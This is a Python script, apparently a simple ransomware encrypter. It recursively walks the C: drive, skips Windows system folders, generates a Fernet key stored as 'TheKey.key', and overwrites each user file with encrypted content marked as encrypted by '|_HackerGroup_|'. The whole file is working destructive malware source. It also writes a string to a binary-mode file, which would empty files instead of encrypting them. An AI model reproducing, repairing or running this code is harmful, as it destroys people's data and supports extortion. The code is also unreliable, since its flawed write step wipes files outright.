import os
from cryptography.fernet import Fernet



root_dir = "C:\\"

def get_all_files(root_dir):
    all_files = []
    excluded_dir = ["System32", "Windows", "Program Files", "AppData", "ProgramData", "$Recycle.Bin", "System Volume Information",
                    "Boot", "Fonts", "Logs", "PolicyDefinitions", "Prefetch", "System", "config", "drivers",
                    "DriverStore", "Logfiles", "spool", "SysWOW64", "Temp", "WinSxS", "Common Files", "Default User", "Default", "Public"]
    for dirpath, dirnames, filenames in os.walk(root_dir):
        #Exclude some directories
        dirnames[:] = [d for d in dirnames if d not in excluded_dir]

        for filename in filenames:
            full_path = os.path.join(dirpath, filename)
            if full_path.endswith(("decrypter.py", "encrypter.py", "TheKey.key", "NTUSER.DAT")):
                continue
            all_files.append(full_path)
    return all_files

files = get_all_files(root_dir)


key = Fernet.generate_key()
#generate a key with fernet and store it in a file named "TheKey.key" AND ignore it in the previous for loop
with open("TheKey.key", "wb") as thekey:
    thekey.write(key)

fernet = Fernet(key)
for file in files:
    try:
        with open(file, "rb") as theFile:
            contentOfFiles = theFile.read()
        #Encrypt data
        encryptedContent = fernet.encrypt(contentOfFiles)
        with open(file, "wb") as theFile:
            theFile.write(f"{encryptedContent}\n File has been encrypted by |_HackerGroup_|")
        print(f"Encrypted {file}")
    except Exception as e:
        print(f"Failed to encrypt {file}: {e}")